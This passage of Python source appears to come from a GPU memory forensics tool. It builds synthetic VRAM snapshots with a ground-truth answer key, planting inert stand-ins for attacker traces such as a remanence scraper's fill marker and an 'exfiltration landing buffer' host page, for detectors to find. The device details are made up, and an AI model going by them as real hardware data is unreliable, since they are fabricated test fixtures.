                             filesystem={"pa": 0x1D10400, "kind": "ext4", "label": "vramfs"},
                             archive={"pa": 0x1D20000, "first": "payload.bin"})
    img.put(0x1A00000, build_rom())
    truth["vbios"] = {"pa": 0x1A00000, "version": "95.07.2D.00.5F", "device": 0x28A1}
    # stray, unreferenced command buffer and QMD (scanner targets)
    stray = _pb(M(2, 0x0000, compute_class), M(2, 0x02B4, 0x3_0000_0000 >> 8), M(2, 0x02BC, 3),
                M(2, 0x1B00, [0, 0x1000, 9, 0]))
    img.put(0x1C00000, stray)
    img.put(0x1C10000, qmd_fmt.make_launch(prog(code_va + 0x100), grid=(64, 1, 1), block=(128, 1, 1), version=qv))
    truth["stray_pushbuffer"] = 0x1C00000
    truth["stray_qmd"] = 0x1C10000
    rnd = random.Random(99)
    img.put(0x1E00000, bytes(rnd.getrandbits(8) for _ in range(K64)))
    truth["noise"] = {"pa": 0x1E00000, "size": K64}
    # a remanence scraper's marker: 2 MiB of 0xFF written into its own allocation
    img.put(0x3800000, bytes([0xFF]) * M2)
    truth["fill"] = {"pa": 0x3800000, "size": M2, "pattern": "ff", "va": 0xA_0000_0000}
    return bytes(img.buf), truth


def build_snapshot_metadata(gen: str = "ada") -> dict:
    chip, cc, arch, name = GENERATION_CHIP[gen]
    return {"tool": "keto-synth", "device": {"name": name + " (synthetic)", "chipset": chip,
                                                  "compute_capability": cc, "nvml_arch": arch,
                                                  "vram_size": VRAM_SIZE},
            "acquisition": {"method": "synthetic", "notes": "ground-truth test image built by keto.testing.synth"}}


def build_all(out_dir: str, real_cubin: Optional[str] = None, gen: str = "ada") -> dict:
    os.makedirs(out_dir, exist_ok=True)
    rc = open(real_cubin, "rb").read() if real_cubin else None
    data, truth = build_image(rc, gen)
    raw = os.path.join(out_dir, "synthetic_vram.raw")
    with open(raw, "wb") as fh:
        fh.write(data)
    with open(raw + ".json", "w") as fh:
        json.dump(build_snapshot_metadata(gen), fh, indent=1)
    keto = os.path.join(out_dir, "synthetic.keto")
    w = ContainerWriter(keto, build_snapshot_metadata(gen))
    w.add_segment("vram", 0, data)
    w.close()
    host = os.path.join(out_dir, "synthetic_host.lime")
    page = bytearray(0x2000)
    page[0:64] = b"HOST-SYSMEM-PAGE: exfiltration landing buffer".ljust(64, b"\x00")
    write_lime(host, [(SYSMEM_TARGET, bytes(page))])
    files = {"raw": raw, "container": keto, "host": host, "truth": os.path.join(out_dir, "ground_truth.json")}
    truth["files"] = files
    with open(files["truth"], "w") as fh:
        json.dump(truth, fh, indent=1, default=lambda v: hex(v) if isinstance(v, int) else str(v))
    return {"files": files, "truth": truth}
